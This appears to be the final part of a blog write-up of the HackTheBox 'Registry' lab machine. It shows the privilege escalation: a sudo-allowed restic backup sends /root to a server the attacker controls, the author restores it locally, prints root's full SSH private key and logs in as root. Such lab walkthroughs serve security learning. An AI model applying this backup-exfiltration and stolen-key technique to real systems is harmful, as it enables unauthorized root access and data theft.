<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 </span><br><span class="line">‚ùØ nc -v 10.10.10.159 12346</span><br><span class="line">registry.htb [10.10.10.159] 12346 (?) open</span><br><span class="line">www-data@bolt:~/html/bolt/files$ </span><br><span class="line"></span><br><span class="line">www-data@bolt:~/html/bolt/files$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8000/ /root</span><br><span class="line">&lt;/restic backup -r rest:http://127.0.0.1:8000/ /root</span><br><span class="line">enter password <span class="keyword">for</span> repository: -------------</span><br><span class="line"></span><br><span class="line">password is correct</span><br><span class="line">found 2 old cache directories <span class="keyword">in</span> /var/www/.cache/restic, pass --cleanup-cache to remove them</span><br><span class="line">scan [/root]</span><br><span class="line">scanned 10 directories, 14 files <span class="keyword">in</span> 0:00</span><br><span class="line">[0:01] 100.00%  28.066 KiB / 28.066 KiB  24 / 24 items  0 errors  ETA 0:00 </span><br><span class="line">duration: 0:01</span><br><span class="line">snapshot 4d60990a saved</span><br><span class="line">www-data@bolt:~/html/bolt/files$</span><br></pre></td></tr></table></figure>

<p>Now it‚Äôs successfully saved on <code>snapshot</code>, back into my machine I will restore the backup I created.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 </span><br><span class="line">‚ùØ restic -r backups/ restore latest --target restore/</span><br><span class="line">enter password <span class="keyword">for</span> repository: </span><br><span class="line">repository 6f893c5d opened successfully, password is correct</span><br><span class="line">created new cache <span class="keyword">in</span> /root/.cache/restic</span><br><span class="line">restoring &lt;Snapshot 4d60990a of [/root] at 2020-04-05 01:58:02.792216091 +0000 UTC by root@bolt&gt; to restore/</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 took 4s </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure>

<p>Success ! Now it will create <code>/restore</code> folder which contains all the files we need, from there I can get the <code>root.txt</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry via üêò v7.3.15 via üêç v2.7.17 </span><br><span class="line">‚ùØ <span class="built_in">cd</span> restore</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> boxes/Registry/restore </span><br><span class="line">‚ùØ ls</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> boxes/Registry/restore </span><br><span class="line">‚ùØ <span class="built_in">cd</span> root</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> Registry/restore/root </span><br><span class="line">‚ùØ ls</span><br><span class="line">config.yml  cron.sh  root.txt</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> Registry/restore/root </span><br><span class="line">‚ùØ cat root.txt</span><br><span class="line">ntrk[---------------------]kztgw</span><br></pre></td></tr></table></figure>

<p>isn‚Äôt enough we need the administrator shell, i will use the <code>id_rsa</code> inside the <code>.ssh</code> so:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> Registry/restore/root </span><br><span class="line">‚ùØ ls -la</span><br><span class="line">total 76</span><br><span class="line">drwx------ 7 root root  4096 Oct 21 18:37 .</span><br><span class="line">drwx------ 3 root root  4096 Apr  5 09:59 ..</span><br><span class="line">lrwxrwxrwx 1 root root     9 May 29  2019 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 root root  3106 Sep 27  2019 .bashrc</span><br><span class="line">drwx------ 2 root root  4096 Sep 27  2019 .cache</span><br><span class="line">drwxr-xr-x 3 root root  4096 Sep 27  2019 .config</span><br><span class="line">-rw-r--r-- 1 root root 20999 Oct 21 18:04 config.yml</span><br><span class="line">-rw-r--r-- 1 root root   118 Oct 21 18:37 cron.sh</span><br><span class="line">drwx------ 3 root root  4096 Sep 27  2019 .gnupg</span><br><span class="line">drwxr-xr-x 3 root root  4096 Oct  9 04:57 .<span class="built_in">local</span></span><br><span class="line">-rw-r--r-- 1 root root   148 Aug 17  2015 .profile</span><br><span class="line">-r-------- 1 root root    33 Sep 27  2019 root.txt</span><br><span class="line">-rw-r--r-- 1 root root    66 Oct 21 18:00 .selected_editor</span><br><span class="line">drwxr-xr-x 2 root root  4096 Oct 17 17:58 .ssh</span><br><span class="line">-rw-r--r-- 1 root root   215 Oct 21 16:59 .wget-hsts</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> Registry/restore/root </span><br><span class="line">‚ùØ <span class="built_in">cd</span> .ssh</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> restore/root/.ssh </span><br><span class="line">‚ùØ ls</span><br><span class="line">authorized_keys  id_rsa  id_rsa.pub</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> restore/root/.ssh </span><br><span class="line">‚ùØ chmod 600 id_rsa</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> restore/root/.ssh </span><br><span class="line">‚ùØ cat id_rsa</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEAmiGiXpswTyHhjgC55jHRWlGX1asEMyDFfkVwhuNohv/4cQKm</span><br><span class="line">cJB/3psQocosq+GMh9Y/uRPUgMcDnrTaNYOdkPS+QLd8vcFKSwSewH1w4/AYLuci</span><br><span class="line">4k71qYsJlkcS2Pb0PqEcpodmXf4OBdTCiCCnjgGhOcvPpKMSCb1vy2Yo+A+eHzKp</span><br><span class="line">1S48LgJRLKU1sGe0KE4MC8g7qpF7NSKOCW69z5KaoopQA3jPxnW17WE9PdGZQvqX</span><br><span class="line">4/Mf9DGdeUrejRlX0BI2EGiZhPKwwKxqIHLRpw4pR4+OjR1sOkAA7UWtMYn/3cs+</span><br><span class="line">IS3L75/i5Qsr0cMCtZ/hQAKtjpPoCCe1qHp7CQIDAQABAoIBAFlvYtQaoLGKK2NG</span><br><span class="line">sJgOGDicV8o37bvtLCvVBzJ+Ck0rgnGw4/s1Hb2BpOj8c2dY/T5k55zxEMGYuVUC</span><br><span class="line">BAxBTtCp8yuCTPOekQluqN9w6myZCK9Ol0NSJeI3N1zn6NvUkG0293T55EBuBp0D</span><br><span class="line">k82BhTg1YeQzi00xAmp8bb5MjUFCiCbSFH1MMpY/9itg1b3mqx7UlyDldMM9UdKH</span><br><span class="line">HS9aZmAzY5/U6wEtJi4mx3QIoVahytMgcxd7qoicCYyVm73HFQsZ58L+5QflygH4</span><br><span class="line">dpbptPOnNmLUkWFXcK3bmlmrEyuafS6z68oDFeAZz8Dg2D2qXWfhdlN4GVstlxSI</span><br><span class="line">skH5sAECgYEAySOp7KOZJVpstF8zjn+/OZowEF4iSHnaGAX64B6GgWwXQURn3wVq</span><br><span class="line">tlqDO5m5vIexe2tyFDSVe5otWtzQvbPNkjpD7/kglGTbT9PCU/Dgb5pTmOxBPi9a</span><br><span class="line">1W8+q7lwiXLIRb4NB+BqDz0yI924BnZt9rukzm9650Rrbala0HZxhIECgYEAxCux</span><br><span class="line">RQUzgSx7YdzThvB8sAzQJj2gNAbwEA9Y56I0pQLvTNoGQY8V8IYBrlvW935kLfcf</span><br><span class="line">xz8j5VNt1BizDQjG8j5FfVcU6VE98/OMgn4XKd6nl9sOoQBXzssjUF+3AIhn5DsK</span><br><span class="line">Q/IymTZEmhfGAt9k6dE4WH8qffea/E7qJY+pkokCgYAdatLiYjb2yJfXdYkD0Vk1</span><br><span class="line">YoCfFDVtZizokI9VkgFYEmgASrHqY09tJiXFZMFOeoYRp/BCVkJ6ll0Fyf/Zjt+F</span><br><span class="line">AHKJOWVzbqDItw7X2gXpLKgHWJ5eKuzdBG0lDnUQFTKHSLl9Kmw4mFmp9zZ/83g3</span><br><span class="line">us/qxVEzW8Vef4Nhs8D8gQKBgDtsMMqDhNKAMu+2AK1Dc8GwX+z1he28nEOBIqEn</span><br><span class="line">1WKWvP4+nN6HBVJShXfXggp+UsJJtWqZiboRx5cT1EkCe6Etk8cf9cmnPmkDQXDV</span><br><span class="line">2RZpx8KMLKZAgFi31/6kv759k1rjN3zVhNY8RhOXV/fOy7a4FaVY//ogYuZC0VKH</span><br><span class="line">bgphAoGBAKGyJQe/b6rUkpzvIBxbGt9Hw1kpLr07VCdPQb1MCdCU4l+mlDD5NBN3</span><br><span class="line">mzygp6MTi+TvN3PhxlfAmUPbz0qw+3aX95pt2cQ492wLOe+RsVsKtvDTgH/2+DUe</span><br><span class="line">2qnb+Jd6ERs3jmBeuuavC2O5ajhyLt1xL3uF5UVpoenCYlYuOvL4</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> restore/root/.ssh </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure>

<h3 id="GET-THE-ADMIN-SHELL"><a href="#GET-THE-ADMIN-SHELL" class="headerlink" title="GET THE ADMIN SHELL"></a>GET THE ADMIN SHELL</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> restore/root/.ssh </span><br><span class="line">‚ùØ ssh -i id_rsa root@registry.htb</span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)</span><br><span class="line"></span><br><span class="line">  System information as of Sun Apr  5 02:06:19 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Users logged <span class="keyword">in</span>:                1</span><br><span class="line">  Usage of /:   5.7% of 61.80GB   IP address <span class="keyword">for</span> eth0:            10.10.10.159</span><br><span class="line">  Memory usage: 38%               IP address <span class="keyword">for</span> br-1bad9bd75d17: 172.18.0.1</span><br><span class="line">  Swap usage:   1%                IP address <span class="keyword">for</span> docker0:         172.17.0.1</span><br><span class="line">  Processes:    169</span><br><span class="line">Last login: Mon Oct 21 09:53:48 2019</span><br><span class="line">root@bolt: whoami</span><br><span class="line">root</span><br><span class="line">root@bolt:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<hr>
<p>If you liked my writeup please leave a respect on my <a href="https://www.hackthebox.eu/profile/128965" target="_blank" rel="noopener">Profile</a></p>
<p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p>
<hr>
<p>Referrences:</p>
<p><a href="https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/" target="_blank" rel="noopener">Anatomy of a hack: Docker Registry</a></p>
<p><a href="https://docs.docker.com/registry/" target="_blank" rel="noopener">Docker Registry</a></p>
<p><a href="https://blog.dixitaditya.com/exploiting-docker-registry/" target="_blank" rel="noopener">Exploiting Docker Registry</a></p>
<p><a href="https://cybarrior.com/blog/2019/05/09/p0wnyshell/" target="_blank" rel="noopener">p0wnyshell</a></p>
<p><a href="https://github.com/Andhrimnirr/Python-Reverse-Bind-Shell" target="_blank" rel="noopener">Bind Shell</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/projects/">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Summary"><span class="toc-number">1.</span> <span class="toc-text">Quick Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Penetration-Testing-Methodologies"><span class="toc-number">2.</span> <span class="toc-text">Penetration Testing Methodologies</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Scanning"><span class="toc-number">3.</span> <span class="toc-text">Network Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Walkthrough"><span class="toc-number">3.1.</span> <span class="toc-text">Walkthrough</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-results"><span class="toc-number">3.2.</span> <span class="toc-text">Nmap results</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">4.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bruteforce-Web-directories"><span class="toc-number">4.1.</span> <span class="toc-text">Bruteforce Web directories</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-install-file"><span class="toc-number">4.2.</span> <span class="toc-text">Get install file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Explore-Docker-Registry"><span class="toc-number">4.3.</span> <span class="toc-text">Explore Docker Registry</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">5.</span> <span class="toc-text">Post - Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Diving-the-Docker-Repository"><span class="toc-number">5.1.</span> <span class="toc-text">Diving the Docker Repository</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploring-the-blobSums"><span class="toc-number">5.2.</span> <span class="toc-text">Exploring the blobSums</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hunting-the-Private-key"><span class="toc-number">5.3.</span> <span class="toc-text">Hunting the Private key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-in-into-the-REGISTRY"><span class="toc-number">5.4.</span> <span class="toc-text">Get in into the REGISTRY</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">6.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Registry-Basic-Information"><span class="toc-number">6.1.</span> <span class="toc-text">Registry Basic Information</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BOLT-CMS-WEBSITE"><span class="toc-number">6.2.</span> <span class="toc-text">BOLT CMS WEBSITE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">7.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RESTIC-BACKUP-PROGRAM"><span class="toc-number">7.1.</span> <span class="toc-text">RESTIC BACKUP PROGRAM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SETTING-UP-THE-SERVER"><span class="toc-number">7.2.</span> <span class="toc-text">SETTING UP THE SERVER</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CREATING-BACKUPS"><span class="toc-number">7.3.</span> <span class="toc-text">CREATING BACKUPS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GET-THE-ADMIN-SHELL"><span class="toc-number">7.4.</span> <span class="toc-text">GET THE ADMIN SHELL</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/&text=HackTheBox - Registry üß∞üóÇÔ∏è" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/&title=HackTheBox - Registry üß∞üóÇÔ∏è" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/&is_video=false&description=HackTheBox - Registry üß∞üóÇÔ∏è" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox - Registry üß∞üóÇÔ∏è&body=Check out this article: https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/&title=HackTheBox - Registry üß∞üóÇÔ∏è" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/&title=HackTheBox - Registry üß∞üóÇÔ∏è" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/&title=HackTheBox - Registry üß∞üóÇÔ∏è" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/&title=HackTheBox - Registry üß∞üóÇÔ∏è" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/&name=HackTheBox - Registry üß∞üóÇÔ∏è&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://ph-payas0.github.io/2020-04-05/HackTheBox-Registry/&t=HackTheBox - Registry üß∞üóÇÔ∏è" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    InfoSec &#64; medz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/projects/">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
